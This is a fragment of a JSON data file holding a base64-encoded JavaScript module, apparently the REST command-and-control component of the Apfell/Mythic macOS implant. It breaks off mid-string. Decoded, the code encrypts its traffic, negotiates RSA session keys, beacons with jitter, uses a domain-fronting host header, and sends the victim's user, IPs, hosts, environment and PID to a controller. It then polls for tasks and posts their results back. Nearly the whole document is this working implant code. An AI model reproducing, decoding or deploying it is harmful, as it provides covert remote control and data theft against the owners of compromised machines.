            "default.js": "Ly8tLS0tLS0tLS0tLS0tUkVTVEZVTCBDMiBtZWNoYW5pc21zIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjbGFzcyBjdXN0b21DMiBleHRlbmRzIGJhc2VDMnsKCWNvbnN0cnVjdG9yKGludGVydmFsLCBiYXNldXJsKXsKCQlzdXBlcihpbnRlcnZhbCwgYmFzZXVybCk7CgkJdGhpcy5jb21tYW5kcyA9IFtdOwoJCXRoaXMuYXBpX3ZlcnNpb24gPSAiMS40IjsKCQl0aGlzLnVybCA9ICJhcGkvdiIgKyB0aGlzLmFwaV92ZXJzaW9uICsgIi9hZ2VudF9tZXNzYWdlLyI7CgkJdGhpcy5qaXR0ZXIgPSBjYWxsYmFja19qaXR0ZXI7CgkJdGhpcy5ob3N0X2hlYWRlciA9ICJkb21haW5fZnJvbnQiOwoJCXRoaXMudXNlcl9hZ2VudCA9ICJVU0VSX0FHRU5UIjsKCQl0aGlzLmFlc19wc2sgPSAiQUVTUFNLIjsgLy8gYmFzZTY0IGVuY29kZWQga2V5CgkJaWYodGhpcy5hZXNfcHNrICE9PSAiIil7CgkJICAgIHRoaXMucGFyYW1ldGVycyA9ICQuQ0ZEaWN0aW9uYXJ5Q3JlYXRlTXV0YWJsZSgkLmtDRkFsbG9jYXRvckRlZmF1bHQsIDAsICQua0NGVHlwZURpY3Rpb25hcnlLZXlDYWxsQmFja3MsICQua0NGVHlwZURpY3Rpb25hcnlWYWx1ZUNhbGxCYWNrcyk7CgkJICAgICQuQ0ZEaWN0aW9uYXJ5U2V0VmFsdWUodGhpcy5wYXJhbWV0ZXJzLCAkLmtTZWNBdHRyS2V5VHlwZSwgJC5rU2VjQXR0cktleVR5cGVBRVMpOwoJCSAgICAkLkNGRGljdGlvbmFyeVNldFZhbHVlKHRoaXMucGFyYW1ldGVycywgJC5rU2VjQXR0cktleVNpemVJbkJpdHMsICQua1NlY0FFUzI1Nik7CgkJICAgICQuQ0ZEaWN0aW9uYXJ5U2V0VmFsdWUodGhpcy5wYXJhbWV0ZXJzLCAkLmtTZWNBdHRyS2V5Q2xhc3MsICQua1NlY0F0dHJLZXlDbGFzc1N5bW1ldHJpYyk7CgkJICAgICQuQ0ZEaWN0aW9uYXJ5U2V0VmFsdWUodGhpcy5wYXJhbWV0ZXJzLCAkLmtTZWNDbGFzcywgJC5rU2VjQ2xhc3NLZXkpOwogICAgICAgICAgICB0aGlzLnJhd19rZXkgPSAkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKHRoaXMuYWVzX3Bzayk7CiAgICAgICAgICAgIGxldCBlcnIgPSBSZWYoKTsKICAgICAgICAgICAgdGhpcy5jcnlwdG9rZXkgPSAkLlNlY0tleUNyZWF0ZUZyb21EYXRhKHRoaXMucGFyYW1ldGVycywgdGhpcy5yYXdfa2V5LCBlcnIpOwoJCX0KICAgICAgICB0aGlzLnVzaW5nX2tleV9leGNoYW5nZSA9ICJlbmNyeXB0ZWRfZXhjaGFuZ2VfY2hlY2siID09PSAiVCI7CgkJdGhpcy5leGNoYW5naW5nX2tleXMgPSB0aGlzLnVzaW5nX2tleV9leGNoYW5nZTsKCQlpZigia2lsbGRhdGUiICE9PSAieXl5eS1tbS1kZCIgJiYgImtpbGxkYXRlIiAhPT0gIiIpewoJCQl0aGlzLmRhdGVGb3JtYXR0ZXIgPSAkLk5TRGF0ZUZvcm1hdHRlci5hbGxvYy5pbml0OwogICAgICAgIAl0aGlzLmRhdGVGb3JtYXR0ZXIuc2V0RGF0ZUZvcm1hdCgieXl5eS1NTS1kZCIpOwogICAgICAgIAl0aGlzLmtpbGxfZGF0ZSA9IHRoaXMuZGF0ZUZvcm1hdHRlci5kYXRlRnJvbVN0cmluZygna2lsbGRhdGUnKTsKCQl9ZWxzZXsKCQkJdGhpcy5raWxsX2RhdGUgPSAkLk5TRGF0ZS5kaXN0YW50RnV0dXJlOwoJCX0KCX0KCWdldF9yYW5kb21faW50KG1heCkgewogICAgICAgIHJldHVybiBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBNYXRoLmZsb29yKG1heCArIDEpKTsKICAgIH0KICBnZW5fc2xlZXBfdGltZSgpewogICAgICAvL2dlbmVyYXRlIGEgdGltZSB0aGF0J3MgdGhpcy5pbnRlcnZhbCArPSAodGhpcy5pbnRlcnZhbCAqIDEvdGhpcy5qaXR0ZXIpCiAgICAgIGlmKHRoaXMuaml0dGVyIDwgMSl7cmV0dXJuIHRoaXMuaW50ZXJ2YWw7fQogICAgICBsZXQgcGx1c19taW4gPSB0aGlzLmdldF9yYW5kb21faW50KDEpOwogICAgICBpZihwbHVzX21pbiA9PT0gMSl7CiAgICAgICAgICByZXR1cm4gdGhpcy5pbnRlcnZhbCArICh0aGlzLmludGVydmFsICogKHRoaXMuZ2V0X3JhbmRvbV9pbnQodGhpcy5qaXR0ZXIpLzEwMCkpOwogICAgICB9ZWxzZXsKICAgICAgICAgIHJldHVybiB0aGlzLmludGVydmFsIC0gKHRoaXMuaW50ZXJ2YWwgKiAodGhpcy5nZXRfcmFuZG9tX2ludCh0aGlzLmppdHRlcikvMTAwKSk7CiAgICAgIH0KICAgIH0KCWVuY3J5cHRfbWVzc2FnZSh1aWQsIGRhdGEpewoJICAgIC8vIHRha2VzIGluIHRoZSBzdHJpbmcgd2UncmUgYWJvdXQgdG8gc2VuZCwgZW5jcnlwdHMgaXQsIGFuZCByZXR1cm5zIGEgbmV3IHN0cmluZwoJICAgIGxldCBlcnIgPSBSZWYoKTsKCSAgICBsZXQgZW5jcnlwdCA9ICQuU2VjRW5jcnlwdFRyYW5zZm9ybUNyZWF0ZSh0aGlzLmNyeXB0b2tleSxlcnIpOwoJICAgIGxldCBiID0gJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZW5jcnlwdCwgJCgiU2VjUGFkZGluZ0tleSIpLCAkKCJTZWNQYWRkaW5nUEtDUzdLZXkiKSwgZXJyKTsKCSAgICBiPSAkLlNlY1RyYW5zZm9ybVNldEF0dHJpYnV0ZShlbmNyeXB0LCAkKCJTZWNFbmNyeXB0aW9uTW9kZSIpLCAkKCJTZWNNb2RlQ0JDS2V5IiksIGVycik7CgogICAgICAgIC8vZ2VuZXJhdGUgYSByYW5kb20gSVYgdG8gdXNlCgkgICAgbGV0IElWID0gJC5OU011dGFibGVEYXRhLmRhdGFXaXRoTGVuZ3RoKDE2KTsKCSAgICAkLlNlY1JhbmRvbUNvcHlCeXRlcygkLmtTZWNSYW5kb21EZWZhdWx0LCAxNiwgSVYuYnl0ZXMpOwoJICAgIGIgPSAkLlNlY1RyYW5zZm9ybVNldEF0dHJpYnV0ZShlbmNyeXB0LCAkKCJTZWNJVktleSIpLCBJViwgZXJyKTsKCSAgICAvLyBzZXQgb3VyIGRhdGEgdG8gYmUgZW5jcnlwdGVkCgkgICAgbGV0IG5zZGF0YSA9ICQoZGF0YSkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU1VURjhTdHJpbmdFbmNvZGluZyk7CiAgICAgICAgYj0kLlNlY1RyYW5zZm9ybVNldEF0dHJpYnV0ZShlbmNyeXB0LCAkLmtTZWNUcmFuc2Zvcm1JbnB1dEF0dHJpYnV0ZU5hbWUsIG5zZGF0YSwgZXJyKTsKICAgICAgICAvLyQuQ0ZTaG93KGVyclswXSk7CiAgICAgICAgbGV0IGVuY3J5cHRlZERhdGEgPSAkLlNlY1RyYW5zZm9ybUV4ZWN1dGUoZW5jcnlwdCwgZXJyKTsKICAgICAgICAvLyBub3cgd2UgbmVlZCB0byBwcmVwZW5kIHRoZSBJViB0byB0aGUgZW5jcnlwdGVkIGRhdGEgYmVmb3JlIHdlIGJhc2U2NCBlbmNvZGUgYW5kIHJldHVybiBpdAogICAgICAgIC8vZ2VuZXJhdGUgdGhlIGhtYWMKCSAgICBsZXQgaG1hY190cmFuc2Zvcm0gPSAkLlNlY0RpZ2VzdFRyYW5zZm9ybUNyZWF0ZSgkKCJITUFDLVNIQTIgRGlnZXN0IEZhbWlseSIpLCAyNTYsIGVycik7CgkgICAgbGV0IGhtYWNfaW5wdXQgPSAkLk5TTXV0YWJsZURhdGEuZGF0YVdpdGhMZW5ndGgoMCk7CgkgICAgaG1hY19pbnB1dC5hcHBlbmREYXRhKElWKTsKCSAgICBobWFjX2lucHV0LmFwcGVuZERhdGEoZW5jcnlwdGVkRGF0YSk7CgkJYj0kLlNlY1RyYW5zZm9ybVNldEF0dHJpYnV0ZShobWFjX3RyYW5zZm9ybSwgJC5rU2VjVHJhbnNmb3JtSW5wdXRBdHRyaWJ1dGVOYW1lLCBobWFjX2lucHV0LCBlcnIpOwoJCWI9JC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoaG1hY190cmFuc2Zvcm0sICQua1NlY0RpZ2VzdEhNQUNLZXlBdHRyaWJ1dGUsICQuTlNEYXRhLmFsbG9jLmluaXRXaXRoQmFzZTY0RW5jb2RpbmcodGhpcy5hZXNfcHNrKSwgZXJyKTsKCQlsZXQgaG1hY19kYXRhID0gJC5TZWNUcmFuc2Zvcm1FeGVjdXRlKGhtYWNfdHJhbnNmb3JtLCBlcnIpOwoKICAgICAgICBsZXQgZmluYWxfbWVzc2FnZSA9ICQuTlNNdXRhYmxlRGF0YS5kYXRhV2l0aExlbmd0aCgwKTsKICAgICAgICBmaW5hbF9tZXNzYWdlLmFwcGVuZERhdGEoICQodWlkKS5kYXRhVXNpbmdFbmNvZGluZygkLk5TVVRGOFN0cmluZ0VuY29kaW5nKSApOwogICAgICAgIGZpbmFsX21lc3NhZ2UuYXBwZW5kRGF0YShJVik7CiAgICAgICAgZmluYWxfbWVzc2FnZS5hcHBlbmREYXRhKGVuY3J5cHRlZERhdGEpOwogICAgICAgIGZpbmFsX21lc3NhZ2UuYXBwZW5kRGF0YShobWFjX2RhdGEpOwogICAgICAgIHJldHVybiBmaW5hbF9tZXNzYWdlLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKTsKCX0KCWRlY3J5cHRfbWVzc2FnZShuc2RhdGEpewogICAgICAgIC8vdGFrZXMgaW4gYSBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgdG8gYmUgZGVjcnlwdGVkIGFuZCByZXR1cm5lZAogICAgICAgIC8vY29uc29sZS5sb2coImNhbGxlZCBkZWNyeXB0Iik7CiAgICAgICAgbGV0IGVyciA9IFJlZigpOwogICAgICAgIGxldCBkZWNyeXB0ID0gJC5TZWNEZWNyeXB0VHJhbnNmb3JtQ3JlYXRlKHRoaXMuY3J5cHRva2V5LCBlcnIpOwogICAgICAgICQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGRlY3J5cHQsICQoIlNlY1BhZGRpbmdLZXkiKSwgJCgiU2VjUGFkZGluZ1BLQ1M3S2V5IiksIGVycik7CgkgICAgJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZGVjcnlwdCwgJCgiU2VjRW5jcnlwdGlvbk1vZGUiKSwgJCgiU2VjTW9kZUNCQ0tleSIpLCBlcnIpOwoJICAgIC8vY29uc29sZS5sb2coIm1ha2luZyByYW5nZXMiKTsKICAgICAgICAvL25lZWQgdG8gZXh0cmFjdCBvdXQgdGhlIGZpcnN0IDE2IGJ5dGVzIGFzIHRoZSBJViBhbmQgdGhlIHJlc3QgaXMgdGhlIG1lc3NhZ2UgdG8gZGVjcnlwdAogICAgICAgIGxldCBpdl9yYW5nZSA9ICQuTlNNYWtlUmFuZ2UoMCwgMTYpOwogICAgICAgIGxldCBtZXNzYWdlX3JhbmdlID0gJC5OU01ha2VSYW5nZSgxNiwgbnNkYXRhLmxlbmd0aCAtIDQ4KTsgLy8gMTYgZm9yIElWIDMyIGZvciBobWFjCiAgICAgICAgbGV0IGhtYWNfcmFuZ2UgPSAkLk5TTWFrZVJhbmdlKG5zZGF0YS5sZW5ndGggLSAzMiwgMzIpOwogICAgICAgIGxldCBobWFjX2RhdGFfcmFuZ2UgPSAkLk5TTWFrZVJhbmdlKDAsIG5zZGF0YS5sZW5ndGggLSAzMik7IC8vIGhtYWMgaW5jbHVkZXMgSVYgKyBjaXBoZXJ0ZXh0CiAgICAgICAgLy9jb25zb2xlLmxvZygiY2FydmluZyBvdXQgaXYiKTsKICAgICAgICBsZXQgaXYgPSBuc2RhdGEuc3ViZGF0YVdpdGhSYW5nZShpdl9yYW5nZSk7CiAgICAgICAgJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZGVjcnlwdCwgJCgiU2VjSVZLZXkiKSwgaXYsIGVycik7CiAgICAgICAgbGV0IG1lc3NhZ2UgPSBuc2RhdGEuc3ViZGF0YVdpdGhSYW5nZShtZXNzYWdlX3JhbmdlKTsKICAgICAgICAkLlNlY1RyYW5zZm9ybVNldEF0dHJpYnV0ZShkZWNyeXB0LCAkKCJJTlBVVCIpLCBtZXNzYWdlLCBlcnIpOwogICAgICAgIC8vIGNyZWF0ZSBhbiBobWFjIGFuZCB2ZXJpZnkgaXQgbWF0Y2hlcwogICAgICAgIGxldCBtZXNzYWdlX2htYWMgPSBuc2RhdGEuc3ViZGF0YVdpdGhSYW5nZShobWFjX3JhbmdlKTsKICAgICAgICBsZXQgaG1hY190cmFuc2Zvcm0gPSAkLlNlY0RpZ2VzdFRyYW5zZm9ybUNyZWF0ZSgkKCJITUFDLVNIQTIgRGlnZXN0IEZhbWlseSIpLCAyNTYsIGVycik7CgkJJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoaG1hY190cmFuc2Zvcm0sICQua1NlY1RyYW5zZm9ybUlucHV0QXR0cmlidXRlTmFtZSwgbnNkYXRhLnN1YmRhdGFXaXRoUmFuZ2UoaG1hY19kYXRhX3JhbmdlKSwgZXJyKTsKCQkkLlNlY1RyYW5zZm9ybVNldEF0dHJpYnV0ZShobWFjX3RyYW5zZm9ybSwgJC5rU2VjRGlnZXN0SE1BQ0tleUF0dHJpYnV0ZSwgJC5OU0RhdGEuYWxsb2MuaW5pdFdpdGhCYXNlNjRFbmNvZGluZyh0aGlzLmFlc19wc2spLCBlcnIpOwoJCWxldCBobWFjX2RhdGEgPSAkLlNlY1RyYW5zZm9ybUV4ZWN1dGUoaG1hY190cmFuc2Zvcm0sIGVycik7CgkJaWYoaG1hY19kYXRhLmlzRXF1YWxUb0RhdGEobWVzc2FnZV9obWFjKSl7CgkJCWxldCBkZWNyeXB0ZWREYXRhID0gJC5TZWNUcmFuc2Zvcm1FeGVjdXRlKGRlY3J5cHQsIFJlZigpKTsKCSAgICAgICAgLy9jb25zb2xlLmxvZygibWFraW5nIGEgc3RyaW5nIGZyb20gdGhlIG1lc3NhZ2UiKTsKCSAgICAgICAgbGV0IGRlY3J5cHRlZF9tZXNzYWdlID0gJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aERhdGFFbmNvZGluZyhkZWNyeXB0ZWREYXRhLCAkLk5TVVRGOFN0cmluZ0VuY29kaW5nKTsKCSAgICAgICAgLy9jb25zb2xlLmxvZyhkZWNyeXB0ZWRfbWVzc2FnZS5qcyk7CgkgICAgICAgIHJldHVybiBkZWNyeXB0ZWRfbWVzc2FnZTsKCQl9CgkJZWxzZXsKCQkJcmV0dXJuIHVuZGVmaW5lZDsKCQl9Cgl9CgluZWdvdGlhdGVfa2V5KCl7CiAgICAgICAgLy8gR2VuZXJhdGUgYSBwdWJsaWMvcHJpdmF0ZSBrZXkgcGFpcgogICAgICAgIGxldCBwYXJhbWV0ZXJzID0gJCh7InR5cGUiOiAkKCI0MiIpLCAiYnNpeiI6IDQwOTYsICJwZXJtIjogZmFsc2V9KTsKICAgICAgICBsZXQgZXJyID0gUmVmKCk7CiAgICAgICAgbGV0IHByaXZhdGVrZXkgPSAkLlNlY0tleUNyZWF0ZVJhbmRvbUtleShwYXJhbWV0ZXJzLCBlcnIpOwogICAgICAgIC8vY29uc29sZS5sb2coImdlbmVyYXRlZCBuZXcga2V5Iik7CiAgICAgICAgbGV0IHB1YmxpY2tleSA9ICQuU2VjS2V5Q29weVB1YmxpY0tleShwcml2YXRla2V5KTsKICAgICAgICBsZXQgZXhwb3J0ZWRfcHVibGljID0gJC5TZWNLZXlDb3B5RXh0ZXJuYWxSZXByZXNlbnRhdGlvbihwdWJsaWNrZXksIGVycik7CiAgICAgICAgLy8kLkNGU2hvdygkLkNGTWFrZUNvbGxlY3RhYmxlKGVyclswXSkpOwogICAgICAgIHRyeXsKICAgICAgICAJLy90aGlzIGlzIHRoZSBjYXRhbGluYSBjYXNlCiAgICAgICAgCWxldCBiNjRfZXhwb3J0ZWRfcHVibGljID0gJC5DRk1ha2VDb2xsZWN0YWJsZShleHBvcnRlZF9wdWJsaWMpOwogICAgICAgIAliNjRfZXhwb3J0ZWRfcHVibGljID0gYjY0X2V4cG9ydGVkX3B1YmxpYy5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCkuanM7IC8vIGdldCBhIGJhc2U2NCBlbmNvZGVkIHN0cmluZyB2ZXJzaW9uCiAgICAgICAgCWV4cG9ydGVkX3B1YmxpYyA9IGI2NF9leHBvcnRlZF9wdWJsaWM7CiAgICAgICAgfWNhdGNoKGVycm9yKXsKICAgICAgICAJLy90aGlzIGlzIHRoZSBtb2phdmUgYW5kIGhpZ2ggc2llcnJhIGNhc2UKICAgICAgICAJZXhwb3J0ZWRfcHVibGljID0gZXhwb3J0ZWRfcHVibGljLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICB9CiAgICAgICAgbGV0IHMgPSAiYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODkiOwoJICAgIGxldCBzZXNzaW9uX2tleSA9IEFycmF5KDIwKS5qb2luKCkuc3BsaXQoJywnKS5tYXAoZnVuY3Rpb24oKSB7IHJldHVybiBzLmNoYXJBdChNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBzLmxlbmd0aCkpOyB9KS5qb2luKCcnKTsKCSAgICBsZXQgaW5pdGlhbF9tZXNzYWdlID0geyJzZXNzaW9uX2lkIjogc2Vzc2lvbl9rZXksICJwdWJfa2V5IjogZXhwb3J0ZWRfcHVibGljLCAiYWN0aW9uIjogInN0YWdpbmdfcnNhIn07CgkgICAgLy8gRW5jcnlwdCBvdXIgaW5pdGlhbCBtZXNzYWdlIHdpdGggc2Vzc2lvbklEIGFuZCBQdWJsaWMga2V5IHdpdGggdGhlIGluaXRpYWwgQUVTIGtleQoJICAgIHdoaWxlKHRydWUpewoJICAgICAgICB0cnl7CgkgICAgICAgIAlsZXQgc3RhZ2UxID0gdGhpcy5odG1sUG9zdERhdGEodGhpcy51cmwsIGluaXRpYWxfbWVzc2FnZSwgYXBmZWxsLnV1aWQpOwoJICAgICAgICAJbGV0IGVuY19rZXkgPSAkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKHN0YWdlMVsnc2Vzc2lvbl9rZXknXSk7CiAgICAgICAgICAgICAgICBsZXQgZGVjX2tleSA9ICQuU2VjS2V5Q3JlYXRlRGVjcnlwdGVkRGF0YShwcml2YXRla2V5LCAkLmtTZWNLZXlBbGdvcml0aG1SU0FFbmNyeXB0aW9uT0FFUFNIQTEsIGVuY19rZXksIGVycik7CiAgICAgICAgICAgICAgICAvLyBBZGp1c3Qgb3VyIGdsb2JhbCBrZXkgaW5mb3JtYXRpb24gd2l0aCB0aGUgbmV3bHkgYWRqdXN0ZWQgc2Vzc2lvbiBrZXkKCQkJCXRyeXsKCQkJCQl0aGlzLmFlc19wc2sgPSBkZWNfa2V5LmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsgLy8gYmFzZTY0IGVuY29kZWQga2V5CgkJCQl9Y2F0Y2goZXJyb3IpewoJCQkJCWxldCBkZWNfa2V5X2NvbGxlY3RhYmxlID0gJC5DRk1ha2VDb2xsZWN0YWJsZShkZWNfa2V5KTsKCQkJCQlkZWNfa2V5X2NvbGxlY3RhYmxlID0gZGVjX2tleV9jb2xsZWN0YWJsZS5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCkuanM7CgkJCQkJdGhpcy5hZXNfcHNrID0gZGVjX2tleV9jb2xsZWN0YWJsZTsKCQkJCX0KICAgICAgICAgICAgICAgIC8vY29uc29sZS5sb2coSlNPTi5zdHJpbmdpZnkoanNvbl9yZXNwb25zZSkpOwogICAgICAgICAgICAgICAgdGhpcy5wYXJhbWV0ZXJzID0gJCh7InR5cGUiOiAkLmtTZWNBdHRyS2V5VHlwZUFFU30pOwogICAgICAgICAgICAgICAgdGhpcy5yYXdfa2V5ID0gJC5OU0RhdGEuYWxsb2MuaW5pdFdpdGhCYXNlNjRFbmNvZGluZyh0aGlzLmFlc19wc2spOwogICAgICAgICAgICAgICAgdGhpcy5jcnlwdG9rZXkgPSAkLlNlY0tleUNyZWF0ZUZyb21EYXRhKHRoaXMucGFyYW1ldGVycywgdGhpcy5yYXdfa2V5LCBSZWYoKSk7CiAgICAgICAgICAgICAgICB0aGlzLmV4Y2hhbmdpbmdfa2V5cyA9IGZhbHNlOwogICAgICAgICAgICAgICAgcmV0dXJuIHN0YWdlMVsndXVpZCddOwogICAgICAgICAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgICAgICAJY29uc29sZS5sb2coZXJyb3IudG9TdHJpbmcoKSk7CiAgICAgICAgICAgICAgICAkLk5TVGhyZWFkLnNsZWVwRm9yVGltZUludGVydmFsKHRoaXMuZ2VuX3NsZWVwX3RpbWUoKSk7ICAvLyBkb24ndCBzcGluIG91dCBjcmF6eSBpZiB0aGUgY29ubmVjdGlvbiBmYWlscwogICAgICAgICAgICB9CiAgICAgICAgfQoJfQoJZ2V0Q29uZmlnKCl7CgkJLy9BIFJFU1RmdWwgYmFzZSBjb25maWcgY29uc2lzdHMgb2YgdGhlIGZvbGxvd2luZzoKCQkvLyAgQmFzZVVSTCAoaW5jbHVkZXMgUG9ydCksIENhbGxiYWNrSW50ZXJ2YWwsIEtpbGxEYXRlIChub3QgaW1wbGVtZW50ZWQgeWV0KQogICAgICAgIGxldCBjb25maWcgPSB7CiAgICAgICAgICAgICJDMiI6IHsKICAgICAgICAgICAgICAgICJiYXNldXJsIjogdGhpcy5iYXNldXJsICsgdGhpcy51cmwsCiAgICAgICAgICAgICAgICAiaW50ZXJ2YWwiOiB0aGlzLmludGVydmFsLAogICAgICAgICAgICAgICAgImppdHRlciI6IHRoaXMuaml0dGVyLAogICAgICAgICAgICAgICAgImNvbW1hbmRzIjogdGhpcy5jb21tYW5kcy5qb2luKCIsICIpLAogICAgICAgICAgICAgICAgImFwaV92ZXJzaW9uIjogdGhpcy5hcGlfdmVyc2lvbiwKICAgICAgICAgICAgICAgICJob3N0X2hlYWRlciI6IHRoaXMuaG9zdF9oZWFkZXIsCiAgICAgICAgICAgICAgICAiYWVzX3BzayI6IHRoaXMuYWVzX3BzawogICAgICAgICAgICB9LAogICAgICAgICAgICAiSG9zdCI6IHsKICAgICAgICAgICAgICAgICJ1c2VyIjogYXBmZWxsLnVzZXIsCiAgICAgICAgICAgICAgICAiZnVsbE5hbWUiOiBhcGZlbGwuZnVsbE5hbWUsCiAgICAgICAgICAgICAgICAiaXBzIjogYXBmZWxsLmlwLAogICAgICAgICAgICAgICAgImhvc3RzIjogYXBmZWxsLmhvc3QsCiAgICAgICAgICAgICAgICAiZW52aXJvbm1lbnQiOiBhcGZlbGwuZW52aXJvbm1lbnQsCiAgICAgICAgICAgICAgICAidXB0aW1lIjogYXBmZWxsLnVwdGltZSwKICAgICAgICAgICAgICAgICJhcmdzIjogYXBmZWxsLmFyZ3MsCiAgICAgICAgICAgICAgICAicGlkIjogYXBmZWxsLnBpZCwKICAgICAgICAgICAgICAgICJhcGZlbGxfaWQiOiBhcGZlbGwuaWQsCiAgICAgICAgICAgICAgICAicGF5bG9hZF9pZCI6IGFwZmVsbC51dWlkCiAgICAgICAgICAgIH19OwoJCXJldHVybiBKU09OLnN0cmluZ2lmeShjb25maWcsIG51bGwsIDIpOwoJfQoJY2hlY2tpbihpcCwgcGlkLCB1c2VyLCBob3N0LCBvcywgYXJjaCl7CgkJLy9nZXQgaW5mbyBhYm91dCBzeXN0ZW0gdG8gY2hlY2sgaW4gaW5pdGlhbGx5CgkJLy9uZWVkcyBJUCwgUElELCB1c2VyLCBob3N0LCBwYXlsb2FkX3R5cGUKCQlsZXQgaW5mbyA9IHsnaXAnOmlwLCdwaWQnOnBpZCwndXNlcic6dXNlciwnaG9zdCc6aG9zdCwndXVpZCc6YXBmZWxsLnV1aWQsICJvcyI6b3MsICJhcmNoaXRlY3R1cmUiOiBhcmNoLCAiYWN0aW9uIjogImNoZWNraW4ifTsKCQlpZih1c2VyID09PSAicm9vdCIpewoJCSAgICBpbmZvWydpbnRlZ3JpdHlfbGV2ZWwnXSA9IDM7CgkJfQoJCS8vY2FsbHMgaHRtbFBvc3REYXRhKHVybCxkYXRhKSB0byBhY3R1YWxseSBjaGVja2luCgkJLy9FbmNyeXB0IG91ciBkYXRhCgkJLy9nZXRzIGJhY2sgYSB1bmlxdWUgSUQKICAgICAgICBpZih0aGlzLnVzaW5nX2tleV9leGNoYW5nZSl7CiAgICAgICAgICAgIGxldCBzZXNzaW9uSUQgPSB0aGlzLm5lZ290aWF0ZV9rZXkoKTsKICAgICAgICAgICAgLy9jb25zb2xlLmxvZygiZ290IHNlc3Npb24gSUQ6ICIgKyBzZXNzaW9uSUQpOwogICAgICAgICAgICB2YXIganNvbmRhdGEgPSB0aGlzLmh0bWxQb3N0RGF0YSh0aGlzLnVybCwgaW5mbywgc2Vzc2lvbklEKTsKICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgdmFyIGpzb25kYXRhID0gdGhpcy5odG1sUG9zdERhdGEodGhpcy51cmwsIGluZm8sIGFwZmVsbC51dWlkKTsKICAgICAgICB9CgkJYXBmZWxsLmlkID0ganNvbmRhdGEuaWQ7CgkJLy8gaWYgd2UgZmFpbCB0byBnZXQgYSBuZXcgSUQgbnVtYmVyLCB0aGVuIGV4aXQgdGhlIGFwcGxpY2F0aW9uCgkJaWYoYXBmZWxsLmlkID09PSB1bmRlZmluZWQpeyAkLk5TQXBwbGljYXRpb24uc2hhcmVkQXBwbGljYXRpb24udGVybWluYXRlKHRoaXMpOyB9CgkJLy9jb25zb2xlLmxvZyhhcGZlbGwuaWQpOwoJCXJldHVybiBqc29uZGF0YTsKCX0KCWdldFRhc2tpbmcoKXsKCQl3aGlsZSh0cnVlKXsKCQkgICAgdHJ5ewoJCSAgICAgICAgLy9sZXQgZGF0YSA9IHsidGFza2luZ19zaXplIjoxLCAiYWN0aW9uIjogImdldF90YXNraW5nIn07CgkJICAgICAgICAvL2xldCB0YXNrID0gdGhpcy5odG1sUG9zdERhdGEodGhpcy51cmwsIGRhdGEsIGFwZmVsbC5pZCk7CgkJCQlsZXQgdGFzayA9IHRoaXMuaHRtbEdldERhdGEodGhpcy51cmwpOwoJCSAgICAgICAgLy9jb25zb2xlLmxvZygidGFza2luZyBnb3QgYmFjazogIiArIEpTT04uc3RyaW5naWZ5KHRhc2spKTsKCQkgICAgICAgIHJldHVybiB0YXNrWyd0YXNrcyddOwoJCSAgICB9CgkJICAgIGNhdGNoKGVycm9yKXsKCQkgICAgCS8vY29uc29sZS5sb2coZXJyb3IudG9TdHJpbmcoKSk7CgkJICAgICAgICAkLk5TVGhyZWFkLnNsZWVwRm9yVGltZUludGVydmFsKHRoaXMuZ2VuX3NsZWVwX3RpbWUoKSk7ICAvLyBkb24ndCBzcGluIG91dCBjcmF6eSBpZiB0aGUgY29ubmVjdGlvbiBmYWlscwoJCSAgICB9CgkJfQoJfQoJcG9zdFJlc3BvbnNlKHRhc2ssIG91dHB1dCl7CgkgICAgLy8gdGhpcyB3aWxsIGdldCB0aGUgdGFzayBvYmplY3QgYW5kIHRoZSByZXNwb25zZSBvdXRwdXQKCSAgICByZXR1cm4gdGhpcy5wb3N0UkVTVFJlc3BvbnNlKHRoaXMudXJsLCBvdXRwdXQsIHRhc2suaWQpOwoJfQoJcG9zdFJFU1RSZXNwb25zZSh1cmxFbmRpbmcsIGRhdGEsIHRpZCl7CgkJLy9kZXBlbmRpbmcgb24gdGhlIGFtb3VudCBvZiBkYXRhIHdlJ3JlIHNlbmRpbmcsIHdlIG1pZ2h0IG5lZWQgdG8gY2h1bmsgaXQKCQlkYXRhWyJ0YXNrX2lkIl0gPSAgdGlkOwoJCWxldCBwb3N0RGF0YSA9IHsiYWN0aW9uIjogInBvc3RfcmVzcG9uc2UiLCAicmVzcG9uc2VzIjogW2RhdGFdfTsKCQlyZXR1cm4gdGhpcy5odG1sUG9zdERhdGEodXJsRW5kaW5nLCBwb3N0RGF0YSwgYXBmZWxsLmlkKTsKCX0KCWh0bWxQb3N0RGF0YSh1cmxFbmRpbmcsIHNlbmREYXRhLCB1aWQsIGpzb249dHJ1ZSl7CgkgICAgbGV0IHVybCA9IHRoaXMuYmFzZXVybCArIHVybEVuZGluZzsKICAgICAgICAvL2NvbnNvbGUubG9nKHVybCk7CiAgICAgICAgLy9lbmNyeXB0IG91ciBpbmZvcm1hdGlvbiBiZWZvcmUgc2VuZGluZyBpdAoJCWxldCBkYXRhOwogICAgICAgIGlmKHRoaXMuYWVzX3BzayAhPT0gIiIpewogICAgICAgICAgICBkYXRhID0gdGhpcy5lbmNyeXB0X21lc3NhZ2UodWlkLCBKU09OLnN0cmluZ2lmeShzZ